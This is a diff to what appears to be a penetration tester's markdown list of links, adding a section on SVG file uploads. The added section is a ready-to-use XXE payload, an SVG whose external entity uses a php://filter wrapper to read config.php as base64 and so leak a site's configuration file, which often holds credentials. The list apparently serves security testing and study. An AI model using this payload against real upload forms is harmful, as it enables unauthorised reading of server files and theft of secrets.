@@ -402,6 +402,13 @@ https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/exploiting-passw
 ### Pen Testing Password Resets
 https://0xayub.gitbook.io/blog/
 
+### file upload using svg
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php"> ]>
+<svg>&xxe;</svg>
+```
 ### file upload bypass
 https://book.hacktricks.xyz/pentesting-web/file-upload
 
